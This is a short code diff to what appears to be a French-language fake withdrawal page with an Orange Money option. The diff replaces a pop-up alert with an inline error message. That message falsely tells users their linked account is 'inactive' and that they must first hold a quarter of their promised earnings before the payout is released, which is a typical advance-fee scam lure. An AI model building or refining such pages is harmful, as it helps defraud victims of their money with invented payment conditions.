@@ -169,6 +169,7 @@
             color: red;
             margin-top: 20px;
             text-align: center;
+            display: none;
         }
 
         .withdrawal-form {
@@ -321,7 +322,8 @@
             document.getElementById('orange-money').addEventListener('click', setWithdrawalInfo);
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Erreur : La liaison avec le compte a été réussie, mais votre compte est inactif. Pour recevoir vos bénéfices, vous devez d\'abord avoir 1/4 de la somme à recevoir afin de justifier l\'activité de votre compte. Une fois cette vérification effectuée, vous recevrez vos bénéfices dans les 5 minutes. Merci.');
+                errorMessage.textContent = 'Erreur : La liaison avec le compte a été réussie, mais votre compte est inactif. Pour recevoir vos bénéfices, vous devez d\'abord avoir 1/4 de la somme à recevoir afin de justifier l\'activité de votre compte. Une fois cette vérification effectuée, vous recevrez vos bénéfices dans les 5 minutes. Merci.';
+                errorMessage.style.display = 'block';
                 withdrawalForm.style.display = 'none';
             });
 
